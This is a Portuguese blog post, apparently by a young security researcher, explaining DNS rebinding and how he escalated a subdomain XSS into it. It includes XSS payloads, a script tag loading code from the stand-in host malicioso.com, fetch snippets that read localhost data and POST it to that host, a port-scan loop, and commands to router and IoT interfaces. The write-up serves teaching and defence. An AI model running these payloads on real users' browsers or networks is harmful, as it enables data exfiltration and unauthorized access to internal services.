---
layout: post
title: "exfiltração de dados usando dns rebinding em aplicações web"
date: 2024-12-12
categories: hacking
---

## introdução

meu nome é davi cruz, sou um jovem pesquisador de segurança com 14 anos. recentemente, durante uma análise de segurança, consegui evoluir um xss aparentemente inútil em um subdomínio para um ataque de dns rebinding no navegador da vítima. esse tipo de ataque pode parecer complicado à primeira vista, mas quando entendido em profundidade, revela-se uma ferramenta incrivelmente poderosa para exfiltração de dados e exploração de recursos internos.

este artigo vai detalhar como funciona o dns rebinding, como é possível combiná-lo com xss para ataques mais complexos e por que ele é uma técnica tão relevante em segurança web.

## o que é dns rebinding?

dns rebinding é uma técnica que explora como navegadores resolvem nomes de domínio e lidam com o cache de dns. ela permite que um atacante manipule um domínio para resolver para diferentes endereços ip ao longo do tempo. isso é especialmente útil para burlar a política de mesma origem (same-origin policy, sop) que normalmente restringe acessos entre diferentes domínios.

### fluxo básico do dns rebinding
1. o atacante registra um domínio malicioso, como `malicioso.com`.
2. o servidor dns controlado pelo atacante é configurado para responder inicialmente com o ip do servidor do atacante.
3. após carregar o código malicioso no navegador da vítima, o servidor dns altera a resolução para um ip interno da rede da vítima, como `127.0.0.1` ou `192.168.x.x`.
4. o navegador da vítima considera o novo ip como pertencente ao domínio original, permitindo que o código javascript acesse recursos internos.

imagem explicando o fluxo básico de dns rebinding:
![fluxo de dns rebinding](https://www.imperva.com/learn/wp-content/uploads/sites/11/2021/08/DNS-Rebinding-Attack.png)

### como funciona o cache de dns no navegador
quando um navegador faz uma requisição para um domínio, ele armazena o ip correspondente em um cache interno. o dns rebinding explora o fato de que alguns navegadores não validam continuamente se o ip do domínio mudou após a primeira resolução. isso permite que o domínio "rebind" para um novo ip sem restrições adicionais.

## evoluindo de um xss para dns rebinding

no caso específico que analisei, o ponto de partida foi um xss em um subdomínio aparentemente inútil. o processo para evoluir esse ataque foi o seguinte:

1. **identificação do xss**:
   - o subdomínio vulnerável permitia a injeção de scripts por meio de um parâmetro de url.
   - usei o seguinte payload para validar a vulnerabilidade:
     ```javascript
     <script>document.body.innerHTML = 'xss ativo';</script>
     ```

2. **carregando o script de dns rebinding**:
   - aproveitei o xss para injetar um script malicioso hospedado no meu domínio controlado (`malicioso.com`).
   - o payload final foi:
     ```javascript
     <script src="http://malicioso.com/script.js"></script>
     ```

3. **realizando o rebinding**:
   - o script injetado estabeleceu uma conexão inicial com `malicioso.com`. após 2 segundos, o servidor dns reconfigurou o domínio para apontar para `127.0.0.1`.
   - no navegador da vítima, o código continuou executando e conseguiu acessar recursos locais.

4. **acessando dados locais**:
   - após o rebinding, utilizei o script para acessar endpoints no localhost e exfiltrar dados:
     ```javascript
     fetch('http://127.0.0.1:8080/dados').then(res => res.text()).then(data => {
       fetch('http://malicioso.com/exfiltrar', {
         method: 'POST',
         body: data
       });
     });
     ```

imagem ilustrando o fluxo completo de xss para dns rebinding:
![xss para dns rebinding](https://miro.medium.com/max/1400/1*JfxfbHd4I0nGbyhViSGAog.png)

## exemplos práticos de exploração com dns rebinding

o dns rebinding pode ser usado para diversos fins maliciosos. abaixo estão alguns cenários que demonstram seu potencial.

### 1. acesso a serviços locais

muitas aplicações expõem serviços apenas na rede interna, como:
- painéis de administração de roteadores (`192.168.x.x`).
- serviços de banco de dados (ex: **elasticsearch**, **kibana**, **redis**).

com dns rebinding, é possível acessar esses serviços diretamente. exemplo:

```javascript
fetch('http://192.168.1.1/admin').then(res => res.text()).then(console.log);
```

### 2. varredura de portas

a técnica também pode ser usada para mapear portas abertas na máquina da vítima:

```javascript
for (let port = 8000; port < 8100; port++) {
  fetch(`http://127.0.0.1:${port}`).then(res => {
    console.log(`porta ${port} aberta!`);
  }).catch(err => {
    console.log(`porta ${port} fechada.`);
  });
}
```

### 3. manipulação de dispositivos iot

muitos dispositivos iot possuem interfaces web inseguras. com dns rebinding, é possível enviar comandos não autorizados para esses dispositivos:

```javascript
fetch('http://192.168.1.100/restart', {
  method: 'POST'
});
```

## exfiltração de dados sensíveis

a exfiltração de dados pode ser feita de maneira eficiente com dns rebinding. aqui está um exemplo de como enviar informações coletadas localmente para o servidor do atacante:

```javascript
fetch('http://127.0.0.1/dados').then(res => res.text()).then(data => {
  fetch('http://malicioso.com/exfiltrar', {
    method: 'POST',
    body: JSON.stringify({ dados: data })
  });
});
```

imagem demonstrando a exfiltração:
![exfiltração via dns rebinding](https://cdn-images-1.medium.com/max/1400/1*JfxfbHd4I0nGbyhViSGAog.png)


